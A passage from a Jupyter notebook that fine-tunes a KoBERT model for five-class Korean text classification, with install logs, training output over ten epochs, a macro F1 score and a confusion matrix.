(from transformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (3.10.7)\n","Collecting tokenizers\u003c0.11,\u003e=0.10.1\n","  Downloading tokenizers-0.10.3-cp39-cp39-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_12_x86_64.manylinux2010_x86_64.whl (3.3 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m3.3/3.3 MB\u001b[0m \u001b[31m82.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hCollecting huggingface-hub==0.0.12\n","  Downloading huggingface_hub-0.0.12-py3-none-any.whl (37 kB)\n","Requirement already satisfied: regex!=2019.12.17 in /usr/local/lib/python3.9/dist-packages (from transformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (2022.10.31)\n","Requirement already satisfied: pyyaml in /usr/local/lib/python3.9/dist-packages (from transformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (6.0)\n","Requirement already satisfied: sacremoses in /usr/local/lib/python3.9/dist-packages (from transformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (0.0.53)\n","Requirement already satisfied: tqdm\u003e=4.27 in /usr/local/lib/python3.9/dist-packages (from transformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (4.65.0)\n","Collecting urllib3\u003c1.26,\u003e=1.20\n","  Downloading urllib3-1.25.11-py2.py3-none-any.whl (127 kB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m128.0/128.0 KB\u001b[0m \u001b[31m17.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: python-dateutil\u003c3.0.0,\u003e=2.1 in /usr/local/lib/python3.9/dist-packages (from botocore\u003c1.19.0,\u003e=1.18.18-\u003eboto3\u003c=1.15.18-\u003ekobert==0.2.3) (2.8.2)\n","Requirement already satisfied: certifi\u003e=2017.4.17 in /usr/local/lib/python3.9/dist-packages (from requests\u003c3,\u003e=2.20.0-\u003emxnet\u003c=1.7.0.post2,\u003e=1.4.0-\u003ekobert==0.2.3) (2022.12.7)\n","Requirement already satisfied: charset-normalizer~=2.0.0 in /usr/local/lib/python3.9/dist-packages (from requests\u003c3,\u003e=2.20.0-\u003emxnet\u003c=1.7.0.post2,\u003e=1.4.0-\u003ekobert==0.2.3) (2.0.12)\n","Requirement already satisfied: idna\u003c4,\u003e=2.5 in /usr/local/lib/python3.9/dist-packages (from requests\u003c3,\u003e=2.20.0-\u003emxnet\u003c=1.7.0.post2,\u003e=1.4.0-\u003ekobert==0.2.3) (3.4)\n","Requirement already satisfied: joblib in /usr/local/lib/python3.9/dist-packages (from sacremoses-\u003etransformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (1.1.1)\n","Requirement already satisfied: six in /usr/local/lib/python3.9/dist-packages (from sacremoses-\u003etransformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (1.16.0)\n","Requirement already satisfied: click in /usr/local/lib/python3.9/dist-packages (from sacremoses-\u003etransformers\u003c=4.8.1,\u003e=4.8.1-\u003ekobert==0.2.3) (8.1.3)\n","Building wheels for collected packages: kobert\n","  Building wheel for kobert (setup.py) ... \u001b[?25l\u001b[?25hdone\n","  Created wheel for kobert: filename=kobert-0.2.3-py3-none-any.whl size=15705 sha256=9559662a687163a9b63b810b83ca5d8848fec0db2f205ab5983f76c8f6b40c82\n","  Stored in directory: /tmp/pip-ephem-wheel-cache-xgq2a31c/wheels/0b/20/d8/031374f3d29b5150c59c814bed091fca7d6d4c8218148bf286\n","Successfully built kobert\n","Installing collected packages: tokenizers, sentencepiece, urllib3, torch, onnxruntime, jmespath, botocore, s3transfer, mxnet, huggingface-hub, transformers, boto3, kobert\n","  Attempting uninstall: tokenizers\n","    Found existing installation: tokenizers 0.9.4\n","    Uninstalling tokenizers-0.9.4:\n","      Successfully uninstalled tokenizers-0.9.4\n","  Attempting uninstall: sentencepiece\n","    Found existing installation: sentencepiece 0.1.97\n","    Uninstalling sentencepiece-0.1.97:\n","      Successfully uninstalled sentencepiece-0.1.97\n","  Attempting uninstall: urllib3\n","    Found existing installation: urllib3 1.26.15\n","    Uninstalling urllib3-1.26.15:\n","      Successfully uninstalled urllib3-1.26.15\n","  Attempting uninstall: torch\n","    Found existing installation: torch 2.0.0+cu118\n","    Uninstalling torch-2.0.0+cu118:\n","      Successfully uninstalled torch-2.0.0+cu118\n","  Attempting uninstall: mxnet\n","    Found existing installation: mxnet 1.9.1\n","    Uninstalling mxnet-1.9.1:\n","      Successfully uninstalled mxnet-1.9.1\n","  Attempting uninstall: transformers\n","    Found existing installation: transformers 4.0.0\n","    Uninstalling transformers-4.0.0:\n","      Successfully uninstalled transformers-4.0.0\n","\u001b[31mERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.\n","torchvision 0.15.1+cu118 requires torch==2.0.0, but you have torch 1.10.1 which is incompatible.\n","torchtext 0.15.1 requires torch==2.0.0, but you have torch 1.10.1 which is incompatible.\n","torchdata 0.6.0 requires torch==2.0.0, but you have torch 1.10.1 which is incompatible.\n","torchaudio 2.0.1+cu118 requires torch==2.0.0, but you have torch 1.10.1 which is incompatible.\u001b[0m\u001b[31m\n","\u001b[0mSuccessfully installed boto3-1.15.18 botocore-1.18.18 huggingface-hub-0.0.12 jmespath-0.10.0 kobert-0.2.3 mxnet-1.7.0.post2 onnxruntime-1.8.0 s3transfer-0.3.7 sentencepiece-0.1.96 tokenizers-0.10.3 torch-1.10.1 transformers-4.8.1 urllib3-1.25.11\n"]}],"source":["!pip install git+https://git@github.com/SKTBrain/KoBERT.git@master"]},{"cell_type":"code","execution_count":22,"metadata":{"executionInfo":{"elapsed":2351,"status":"ok","timestamp":1680841369401,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"-YEEdtVtNdDG"},"outputs":[],"source":["import torch   # 파이토치: 딥러닝 프레임워크\n","from torch import nn   # nn: neural network 모듈을 제공하는 서브 패키지\n","import torch.nn.functional as F  # nn모듈에서 자주 사용되는 함수 제공\n","import torch.optim as optim   # 최적화 알고리즘 제공\n","from torch.utils.data import Dataset, DataLoader   # 파이토치에서 제공하는 데이터셋 및 데이터로더\n","import gluonnlp as nlp   # 자연어 처리를 위한 라이브러리\n","import numpy as np\n","from tqdm import tqdm, tqdm_notebook  # 반복 작업의 진행률 표시"]},{"cell_type":"code","execution_count":23,"metadata":{"executionInfo":{"elapsed":10,"status":"ok","timestamp":1680841369402,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"l2uBxZuJzkia"},"outputs":[],"source":["#kobert\n","from kobert.utils import get_tokenizer   # koBERT 토크나이저\n","from kobert.pytorch_kobert import get_pytorch_kobert_model   # koBERT 모델\n","\n","#transformers\n","from transformers import AdamW   # 옵티마이저\n","from transformers.optimization import get_cosine_schedule_with_warmup  # 학습률을 조정"]},{"cell_type":"code","execution_count":24,"metadata":{"executionInfo":{"elapsed":10,"status":"ok","timestamp":1680841369402,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"j_c2-snBzmJF"},"outputs":[],"source":["device = torch.device(\"cuda:0\")"]},{"cell_type":"code","execution_count":25,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":11,"status":"ok","timestamp":1680841369403,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"4qrizJSy1Ilx","outputId":"8bd5bf8c-9552-4094-d91b-72d9dc82ad1c"},"outputs":[{"name":"stdout","output_type":"stream","text":["1\n","Tesla T4\n"]}],"source":["import os\n","\n","n_devices = torch.cuda.device_count()\n","print(n_devices)\n","\n","#gpu 개수 확인\n","for i in range(n_devices):\n","    print(torch.cuda.get_device_name(i))"]},{"cell_type":"code","execution_count":26,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":9,"status":"ok","timestamp":1680841369403,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"zf7aeN5s1NhX","outputId":"b5ab3bff-8fbd-460e-dc0c-7f75bcec881c"},"outputs":[{"name":"stdout","output_type":"stream","text":["There are 1 GPU(s) available.\n","We will use the GPU: Tesla T4\n"]}],"source":["# gpu 이름\n","if torch.cuda.is_available():    \n","    device = torch.device(\"cuda\")\n","    print('There are %d GPU(s) available.' % torch.cuda.device_count())\n","    print('We will use the GPU:', torch.cuda.get_device_name(0))\n","else:\n","    device = torch.device(\"cpu\")\n","    print('No GPU available, using the CPU instead.')"]},{"cell_type":"code","execution_count":27,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":11430,"status":"ok","timestamp":1680841380826,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"Lw95KlgaNdGk","outputId":"99358a26-8568-4cbd-f65e-7d2a47ad9b52"},"outputs":[{"name":"stdout","output_type":"stream","text":["/content/.cache/kobert_v1.zip[██████████████████████████████████████████████████]\n","/content/.cache/kobert_news_wiki_ko_cased-1087f8699e.spiece[██████████████████████████████████████████████████]\n"]}],"source":["# bertmodel은 가져온 KoBERT 모델\n","# vocab은 가져온 KoBERT 모델의 vocab\n","\n","bertmodel, vocab = get_pytorch_kobert_model()"]},{"cell_type":"code","execution_count":28,"metadata":{"executionInfo":{"elapsed":11,"status":"ok","timestamp":1680841380827,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"xbawolK44g0w"},"outputs":[],"source":["## Setting parameters\n","max_len = 500 # 해당 길이를 초과하는 단어에 대해선 bert가 학습하지 않음 / 어짜피 최대 길이가 512인 것 같음 (??)\n","batch_size = 8 # 배치키우면 GPU 터집니다\n","warmup_ratio = 0.1\n","num_epochs = 10\n","max_grad_norm = 1\n","log_interval = 100\n","learning_rate = 5e-5"]},{"cell_type":"code","execution_count":29,"metadata":{"executionInfo":{"elapsed":11,"status":"ok","timestamp":1680841380828,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"8u44A3Vb66by"},"outputs":[],"source":["class BERTDataset(Dataset):\n","    def __init__(self, dataset, sent_idx, label_idx, bert_tokenizer, max_len,\n","                 pad, pair):\n","        transform = nlp.data.BERTSentenceTransform(\n","            bert_tokenizer, max_seq_length=max_len, pad=pad, pair=pair) \n","\n","        self.sentences = [transform([i[sent_idx]]) for i in dataset]\n","        self.labels = [np.int32(i[label_idx]) for i in dataset]\n","\n","    def __getitem__(self, i):\n","        return (self.sentences[i] + (self.labels[i], ))\n","\n","    def __len__(self):\n","        return (len(self.labels))"]},{"cell_type":"code","execution_count":30,"metadata":{"executionInfo":{"elapsed":10,"status":"ok","timestamp":1680841380828,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"U6vkC1dE1UMQ"},"outputs":[],"source":["class BERTClassifier(nn.Module):\n","    def __init__(self,\n","                 bert,  # 사용할 BERT 모델\n","                 hidden_size = 768,  # BERT 모델의 히든 사이즈\n","                 # 기존 -\u003e num_classes = 2\n","                 num_classes = 5, # softmax 사용(다중분류)\n","                 dr_rate=None,  # dropout 비율\n","                 params=None):  # 추가 파라미터\n","        super(BERTClassifier, self).__init__()\n","        self.bert = bert\n","        self.dr_rate = dr_rate\n","                 \n","        self.classifier = nn.Linear(hidden_size , num_classes)\n","        if dr_rate:\n","            self.dropout = nn.Dropout(p=dr_rate)\n","    \n","    def gen_attention_mask(self, token_ids, valid_length):\n","        attention_mask = torch.zeros_like(token_ids)\n","        for i, v in enumerate(valid_length):\n","            attention_mask[i][:v] = 1\n","        return attention_mask.float()\n","\n","    def forward(self, token_ids, valid_length, segment_ids):\n","        attention_mask = self.gen_attention_mask(token_ids, valid_length)\n","        \n","        _, pooler = self.bert(input_ids = token_ids, token_type_ids = segment_ids.long(), attention_mask = attention_mask.float().to(token_ids.device))\n","        if self.dr_rate:\n","            out = self.dropout(pooler)\n","        return self.classifier(out)"]},{"cell_type":"code","execution_count":31,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":10,"status":"ok","timestamp":1680841380829,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"5ATj3V-45BLx","outputId":"e503b9a3-6514-4901-bdfc-ce3360074c22"},"outputs":[{"name":"stdout","output_type":"stream","text":["using cached model. /content/.cache/kobert_news_wiki_ko_cased-1087f8699e.spiece\n"]}],"source":["tokenizer = get_tokenizer()  # get_tokenizer는 SentencePiece 토크나이저가 반환\n","tok = nlp.data.BERTSPTokenizer(tokenizer, vocab, lower=False) # 대소문자 구분 토크나이저"]},{"cell_type":"code","execution_count":32,"metadata":{"executionInfo":{"elapsed":1599,"status":"ok","timestamp":1680841382421,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"erRo_r3P1UT1"},"outputs":[],"source":["data_train = BERTDataset(train, 0, 1, tok, max_len, True, False)\n","data_test = BERTDataset(test, 0, 1, tok, max_len, True, False)"]},{"cell_type":"code","execution_count":33,"metadata":{"executionInfo":{"elapsed":3478,"status":"ok","timestamp":1680841385892,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"OzJ0kGH38AH8"},"outputs":[],"source":["model = BERTClassifier(bertmodel, dr_rate=0.5).to(device)"]},{"cell_type":"code","execution_count":34,"metadata":{"executionInfo":{"elapsed":31,"status":"ok","timestamp":1680841385893,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"dt42kPJgACUY"},"outputs":[],"source":["# Prepare optimizer and schedule (linear warmup and decay)\n","no_decay = ['bias', 'LayerNorm.weight']\n","optimizer_grouped_parameters = [\n","    {'params': [p for n, p in model.named_parameters() if not any(nd in n for nd in no_decay)], 'weight_decay': 0.01},\n","    {'params': [p for n, p in model.named_parameters() if any(nd in n for nd in no_decay)], 'weight_decay': 0.0}\n","]"]},{"cell_type":"code","execution_count":35,"metadata":{"executionInfo":{"elapsed":29,"status":"ok","timestamp":1680841385893,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"FpKDSZUNAKJG"},"outputs":[],"source":["# 옵티마이저 선언\n","optimizer = AdamW(optimizer_grouped_parameters, lr=learning_rate)\n","loss_fn = nn.CrossEntropyLoss() # softmax용 Loss Function 정하기 \u003c- binary classification도 해당 loss function 사용 가능\n","\n","t_total = len(train) * num_epochs\n","warmup_step = int(t_total * warmup_ratio)\n","\n","scheduler = get_cosine_schedule_with_warmup(optimizer, num_warmup_steps=warmup_step, num_training_steps=t_total)\n","# 불필요한 학습을 줄이고, 높은 정확도를 얻을 수 있도록 도와줌"]},{"cell_type":"code","execution_count":36,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":28,"status":"ok","timestamp":1680841385893,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"cDQjrd4ne_MZ","outputId":"b95217eb-8f2d-4937-b6b5-950abb1ffeb0"},"outputs":[{"data":{"text/plain":["2964"]},"execution_count":36,"metadata":{},"output_type":"execute_result"}],"source":["len(train)"]},{"cell_type":"code","execution_count":37,"metadata":{"executionInfo":{"elapsed":26,"status":"ok","timestamp":1680841385894,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"e-3sO1ihAMpF"},"outputs":[],"source":["# 학습 평가 지표인 accuracy 계산 -\u003e 얼마나 타겟값을 많이 맞추었는가\n","def calc_accuracy(X,Y):\n","    max_vals, max_indices = torch.max(X, 1)\n","    train_acc = (max_indices == Y).sum().data.cpu().numpy()/max_indices.size()[0]\n","    return train_acc"]},{"cell_type":"code","execution_count":38,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":26,"status":"ok","timestamp":1680841385894,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"W6zcRnFRA3nU","outputId":"588e8a46-0991-4669-b5b7-8d3ffb1eb875"},"outputs":[{"name":"stderr","output_type":"stream","text":["/usr/local/lib/python3.9/dist-packages/torch/utils/data/dataloader.py:478: UserWarning: This DataLoader will create 5 worker processes in total. Our suggested max number of worker in current system is 2, which is smaller than what this DataLoader is going to create. Please be aware that excessive worker creation might get DataLoader running slow or even freeze, lower the worker number to avoid potential slowness/freeze if necessary.\n","  warnings.warn(_create_warning_msg(\n"]}],"source":["# pytorch용 DataLoader 사용\n","train_dataloader = torch.utils.data.DataLoader(data_train, batch_size=batch_size, num_workers=5)\n","test_dataloader = torch.utils.data.DataLoader(data_test, batch_size=batch_size, num_workers=5)"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"background_save":true,"base_uri":"https://localhost:8080/","height":564},"id":"lFp4N4ZaACXI"},"outputs":[{"name":"stderr","output_type":"stream","text":["\u003cipython-input-49-27f5e09dc6a3\u003e:7: TqdmDeprecationWarning: This function will be removed in tqdm==5.0.0\n","Please use `tqdm.notebook.tqdm` instead of `tqdm.tqdm_notebook`\n","  for batch_id, (token_ids, valid_length, segment_ids, label) in enumerate(tqdm_notebook(train_dataloader)):\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"21388d65f4d84cb9bd99ce9ba5eca2ec","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stderr","output_type":"stream","text":["/usr/local/lib/python3.9/dist-packages/torch/utils/data/dataloader.py:478: UserWarning: This DataLoader will create 5 worker processes in total. Our suggested max number of worker in current system is 2, which is smaller than what this DataLoader is going to create. Please be aware that excessive worker creation might get DataLoader running slow or even freeze, lower the worker number to avoid potential slowness/freeze if necessary.\n","  warnings.warn(_create_warning_msg(\n"]},{"name":"stdout","output_type":"stream","text":["epoch 1 batch id 1 loss 1.5592460632324219 train acc 0.25\n","epoch 1 batch id 101 loss 1.4056774377822876 train acc 0.1943069306930693\n","epoch 1 batch id 201 loss 1.3149564266204834 train acc 0.2842039800995025\n","epoch 1 batch id 301 loss 1.3695592880249023 train acc 0.35299003322259137\n","epoch 1 train acc 0.3888140161725067\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"81f638d57db845bfaab0d2617be27645","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 2 batch id 1 loss 1.0982705354690552 train acc 0.5\n","epoch 2 batch id 101 loss 0.7394838333129883 train acc 0.551980198019802\n","epoch 2 batch id 201 loss 0.9465224742889404 train acc 0.6057213930348259\n","epoch 2 batch id 301 loss 0.9745570421218872 train acc 0.6474252491694352\n","epoch 2 train acc 0.6634097035040432\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"a9b465120af04e128f2af25aa57d6e3a","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 3 batch id 1 loss 0.4631185829639435 train acc 0.875\n","epoch 3 batch id 101 loss 0.35074979066848755 train acc 0.7512376237623762\n","epoch 3 batch id 201 loss 0.5720463395118713 train acc 0.7898009950248757\n","epoch 3 batch id 301 loss 0.6837641000747681 train acc 0.8147840531561462\n","epoch 3 train acc 0.8136792452830188\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"1bcea65195884dda97b638de6b0c9044","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 4 batch id 1 loss 0.4927529990673065 train acc 0.875\n","epoch 4 batch id 101 loss 0.20004713535308838 train acc 0.8316831683168316\n","epoch 4 batch id 201 loss 0.07531139254570007 train acc 0.8557213930348259\n","epoch 4 batch id 301 loss 0.04217860475182533 train acc 0.875\n","epoch 4 train acc 0.8736522911051213\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"66c1d36da826453f884a65b02d6ec950","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 5 batch id 1 loss 0.04413619264960289 train acc 1.0\n","epoch 5 batch id 101 loss 0.09916771948337555 train acc 0.8638613861386139\n","epoch 5 batch id 201 loss 0.017381830140948296 train acc 0.8980099502487562\n","epoch 5 batch id 301 loss 0.16296149790287018 train acc 0.9053156146179402\n","epoch 5 train acc 0.9059973045822103\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"59602e348a6b4830942a1d746c77820d","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 6 batch id 1 loss 0.014910101890563965 train acc 1.0\n","epoch 6 batch id 101 loss 0.9221091270446777 train acc 0.8886138613861386\n","epoch 6 batch id 201 loss 0.012650590389966965 train acc 0.9185323383084577\n","epoch 6 batch id 301 loss 0.004186771810054779 train acc 0.925249169435216\n","epoch 6 train acc 0.9258760107816711\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"f2409308ba6f4f56a40299d02970b347","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 7 batch id 1 loss 0.43661898374557495 train acc 0.875\n","epoch 7 batch id 101 loss 0.009636741131544113 train acc 0.9306930693069307\n","epoch 7 batch id 201 loss 0.007166202645748854 train acc 0.9353233830845771\n","epoch 7 batch id 301 loss 0.006004333030432463 train acc 0.9393687707641196\n","epoch 7 train acc 0.9400269541778976\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"963499ed56a243f9a76eee285d4fc722","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 8 batch id 1 loss 0.016919732093811035 train acc 1.0\n","epoch 8 batch id 101 loss 0.006133790593594313 train acc 0.9344059405940595\n","epoch 8 batch id 201 loss 0.002496051602065563 train acc 0.9490049751243781\n","epoch 8 batch id 301 loss 0.02877727523446083 train acc 0.9480897009966778\n","epoch 8 train acc 0.942722371967655\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"6394b9c43105440c90322c00bb629c10","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 9 batch id 1 loss 0.7446991801261902 train acc 0.875\n","epoch 9 batch id 101 loss 0.08125760406255722 train acc 0.9183168316831684\n","epoch 9 batch id 201 loss 0.8914961218833923 train acc 0.9303482587064676\n","epoch 9 batch id 301 loss 0.009150201454758644 train acc 0.9323089700996677\n","epoch 9 train acc 0.933288409703504\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"ff2dbbf5af614e958bd84a51408bc8b8","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/371 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"},{"name":"stdout","output_type":"stream","text":["epoch 10 batch id 1 loss 0.009318504482507706 train acc 1.0\n","epoch 10 batch id 101 loss 0.024591125547885895 train acc 0.9381188118811881\n","epoch 10 batch id 201 loss 0.0022161200176924467 train acc 0.9527363184079602\n","epoch 10 batch id 301 loss 0.002303563291206956 train acc 0.954734219269103\n","epoch 10 train acc 0.9551886792452831\n"]}],"source":["# 모델 학습 시작\n","for e in range(num_epochs):\n","    train_acc = 0.0\n","    test_acc = 0.0\n","    \n","    model.train()\n","    for batch_id, (token_ids, valid_length, segment_ids, label) in enumerate(tqdm_notebook(train_dataloader)):\n","        optimizer.zero_grad()\n","        token_ids = token_ids.long().to(device)\n","        segment_ids = segment_ids.long().to(device)\n","        valid_length= valid_length\n","        label = label.long().to(device)\n","        out = model(token_ids, valid_length, segment_ids)\n","        loss = loss_fn(out, label)\n","        loss.backward()\n","        torch.nn.utils.clip_grad_norm_(model.parameters(), max_grad_norm) # gradient clipping\n","        optimizer.step()\n","        scheduler.step()  # Update learning rate schedule\n","        train_acc += calc_accuracy(out, label)\n","        if batch_id % log_interval == 0:\n","            print(\"epoch {} batch id {} loss {} train acc {}\".format(e+1, batch_id+1, loss.data.cpu().numpy(), train_acc / (batch_id+1)))\n","    print(\"epoch {} train acc {}\".format(e+1, train_acc / (batch_id+1)))\n","    \n","    # model.eval() # 평가 모드로 변경\n","    \n","    # for batch_id, (token_ids, valid_length, segment_ids, label) in enumerate(tqdm_notebook(test_dataloader)):\n","    #     token_ids = token_ids.long().to(device)\n","    #     segment_ids = segment_ids.long().to(device)\n","    #     valid_length= valid_length\n","    #     label = label.long().to(device)\n","    #     out = model(token_ids, valid_length, segment_ids)\n","    #     test_acc += calc_accuracy(out, label)\n","    # print(\"epoch {} test acc {}\".format(e+1, test_acc / (batch_id+1)))"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/","height":103},"executionInfo":{"elapsed":25665,"status":"ok","timestamp":1680791603677,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"Uu1l7C8tACZ_","outputId":"6fe4a4f7-9fe1-41aa-ff1c-5b422d58e527"},"outputs":[{"name":"stderr","output_type":"stream","text":["\u003cipython-input-37-cbb02b0d5d6a\u003e:3: TqdmDeprecationWarning: This function will be removed in tqdm==5.0.0\n","Please use `tqdm.notebook.tqdm` instead of `tqdm.tqdm_notebook`\n","  for batch_id, (token_ids, valid_length, segment_ids, label) in enumerate(tqdm_notebook(test_dataloader)):\n"]},{"data":{"application/vnd.jupyter.widget-view+json":{"model_id":"42ccf4ed7fb44d15b7e2daf03a6147d3","version_major":2,"version_minor":0},"text/plain":["  0%|          | 0/93 [00:00\u003c?, ?it/s]"]},"metadata":{},"output_type":"display_data"}],"source":["result=[]\n","model.eval()\n","for batch_id, (token_ids, valid_length, segment_ids, label) in enumerate(tqdm_notebook(test_dataloader)):\n","  token_ids = token_ids.long().to(device)\n","  segment_ids = segment_ids.long().to(device)\n","  valid_length= valid_length\n","  out = model(token_ids, valid_length, segment_ids)\n","  result.append(out.tolist())"]},{"cell_type":"code","execution_count":null,"metadata":{"id":"2HvGIAfwG-9c"},"outputs":[],"source":["result=sum(result,[])"]},{"cell_type":"code","execution_count":null,"metadata":{"id":"bNYUGVp6HKkb"},"outputs":[],"source":["pred=[]\n","for r in result:\n","  pred.append(np.argmax(r))"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":21,"status":"ok","timestamp":1680791603679,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"DSaVgjgen99Y","outputId":"f0528ca3-62ca-42ac-e9be-0f37c96524b5"},"outputs":[{"data":{"text/plain":["array([0, 1, 2, 3, 4])"]},"execution_count":40,"metadata":{},"output_type":"execute_result"}],"source":["np.unique(pred)"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":20,"status":"ok","timestamp":1680791603679,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"mz5N4IGkoO78","outputId":"8e137e2d-c2ab-44e9-9f72-9e7ed2e41288"},"outputs":[{"data":{"text/plain":["list"]},"execution_count":41,"metadata":{},"output_type":"execute_result"}],"source":["type(y_test)"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":17,"status":"ok","timestamp":1680791603679,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"fnNnprnkoC45","outputId":"29e4c967-c0cb-4046-b34a-64e8b084515d"},"outputs":[{"data":{"text/plain":["array([0, 1, 2, 3, 4])"]},"execution_count":42,"metadata":{},"output_type":"execute_result"}],"source":["np.unique(y_test)"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":15,"status":"ok","timestamp":1680791603679,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"ru-64SqnHYGd","outputId":"7153c674-0c32-47bf-949f-170355eb1a14"},"outputs":[{"data":{"text/plain":["0.8297147044028194"]},"execution_count":43,"metadata":{},"output_type":"execute_result"}],"source":["from sklearn.metrics import f1_score, confusion_matrix, classification_report\n","f1_score(y_test, pred, average='macro')"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":376,"status":"ok","timestamp":1680792096221,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"npC-0Hs3Qs5d","outputId":"22d14a26-d453-46dd-cf3b-cd8df1d0f684"},"outputs":[{"data":{"text/plain":["array([[271,   9,  31,   5,   1],\n","       [ 22, 101,  17,   7,   0],\n","       [ 18,   3, 122,   3,   0],\n","       [  6,   2,  13,  91,   0],\n","       [  0,   0,   0,   1,  19]])"]},"execution_count":44,"metadata":{},"output_type":"execute_result"}],"source":["confusion_matrix(y_test, 